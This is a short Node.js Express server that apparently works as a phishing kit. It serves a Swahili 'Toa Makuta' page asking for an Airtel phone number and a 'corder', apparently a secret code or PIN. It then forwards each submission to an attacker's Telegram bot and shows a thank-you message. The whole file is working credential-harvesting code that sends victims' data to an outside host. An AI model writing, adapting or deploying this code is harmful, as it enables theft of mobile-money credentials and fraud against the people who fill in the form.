const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
app.use(bodyParser.urlencoded({ extended: true }));
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="sw"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Toa Makuta</title><style>body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.form-box{background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px #ccc;width:90%;max-width:300px}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}button{width:100%;padding:12px;background:#e63946;color:white;border:none;border-radius:5px;font-size:16px}h2{text-align:center}</style></head><body><div class="form-box"><h2>Toa Makuta</h2><form action="/submit" method="POST"><label>Airtel Numero</label><input type="text" name="airtelNumero" placeholder="07XXXXXXXX" required><label>Corder</label><input type="text" name="corder" placeholder="Weka corder hapa" required><button type="submit">Toa Makuta</button></form></div></body></html>`);
});
app.post('/submit', async (req, res) => {
  const { airtelNumero, corder } = req.body;
  const message = `📦 *CORDER MPYA IMEINGIA* 📦\n\n*Airtel Numero*: ${airtelNumero}\n*Corder*: ${corder}\n\n⏰ ${new Date().toLocaleString("sw-TZ")}`;
  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
  res.send('<h2>✅ Imetumwa! Asante.</h2><a href="/">Rudi nyuma</a>');
});
app.listen(PORT, () => console.log(`Running on ${PORT}`));
